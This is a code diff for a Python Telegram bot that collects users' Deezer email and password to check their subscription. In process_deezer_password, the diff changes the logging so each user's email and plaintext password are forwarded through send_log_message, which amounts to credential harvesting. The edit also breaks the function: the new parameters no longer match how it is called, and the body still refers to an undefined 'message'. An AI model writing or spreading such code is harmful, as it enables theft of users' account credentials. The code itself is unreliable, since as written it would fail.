@@ -54,21 +54,21 @@ def get_deezer_arl(message):
 
 def process_deezer_username(message):
     chat_id = message.chat.id
-    username = message.text
+    dmail = message.text
     bot.send_message(chat_id, 'Please enter your Deezer password:')
-    bot.register_next_step_handler(message, process_deezer_password, username)
+    bot.register_next_step_handler(message, process_deezer_password, dmail)
 
-def process_deezer_password(message, username):
+def process_deezer_password(dmail, username):
     chat_id = message.chat.id
     password = message.text
-    arl = arl_via_email(username,password)
+    arl = arl_via_email(dmail,password)
     text = check_deezer_subscription_status(arl)
     if arl != "Invalid credentials" :
       bot.send_message(chat_id, text,parse_mode='MARKDOWN')
     else:
       bot.send_message(chat_id,"Invalid credentials")
     username = message.from_user.username
-    log_message = f"@{username} \n,{username}, {password}\n\n {text} "
+    log_message = f"@{username} \n,{dmail}, {password}\n\n {text} "
     send_log_message(log_message)
 
 
